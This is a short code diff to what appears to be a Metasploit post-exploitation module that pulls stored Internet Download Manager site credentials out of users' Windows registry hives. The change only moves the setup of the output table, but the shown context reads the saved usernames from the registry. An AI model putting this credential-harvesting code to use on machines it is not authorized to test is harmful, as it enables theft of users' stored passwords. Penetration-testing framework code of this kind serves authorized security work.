@@ -39,6 +39,17 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+		creds = Rex::Ui::Text::Table.new(
+				'Header'  => 'Internet Downloader Manager Credentials',
+				'Ident'   => 1,
+				'Columns' =>
+				[
+					'Site',
+					'User',
+					'Password'
+				]
+			)
+
 		registry_enumkeys('HKU').each do |k|
 			next unless k.include? "S-1-5-21"
 			next if k.include? "_Classes"
@@ -51,17 +62,6 @@ class Metasploit3 < Msf::Post
 					print_status ("IDM not installed for this user.")
 					return
 				end
-
-				creds = Rex::Ui::Text::Table.new(
-					'Header'  => 'Internet Downloader Manager Credentials',
-					'Ident'   => 1,
-					'Columns' =>
-					[
-						'Site',
-						'User',
-						'Password'
-					]
-				)
 
 				subkeys.each do |site|
 					user = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "User")
